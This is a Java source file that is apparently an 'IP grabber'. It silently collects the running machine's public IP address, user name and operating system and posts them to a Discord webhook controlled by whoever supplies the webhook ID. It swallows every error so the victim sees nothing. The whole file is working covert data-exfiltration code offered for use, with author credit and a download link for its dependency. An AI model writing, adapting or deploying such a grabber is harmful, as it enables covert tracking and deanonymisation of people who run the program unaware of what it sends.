import net.ranktw.DiscordWebHooks.DiscordMessage;
import net.ranktw.DiscordWebHooks.DiscordWebhook;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

public class main {
    public static void main(String[]args){
        try{

            String webhook = "!!!!!discord webhook id here!!!!!";
            DiscordWebhook discord = new DiscordWebhook(webhook);

            URL ipcheckurl = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
            ipcheckurl.openStream()));

            final String os = System.getProperty("os.name");;
            final String pcname = System.getProperty("user.name");
            final String ip = bufferedReader.readLine();

            DiscordMessage dm = new DiscordMessage.Builder()
                    .withUsername("Discord")
                    .withContent("ip: "+ip+"\nname: "+pcname+"\nos: "+os)
                    .build();
            discord.sendMessage(dm);

        }catch (Exception ignore){}
    }
}

//Discord webhook api (with dependencies) -- https://github.com/RANKTW/Discord-Webhooks-API/releases/download/v1.0/Discord-Webhooks-API-WithDependencies.jar
//Gets ip, pc name, and os
//created by Matchey#1300 on 2/25/2021
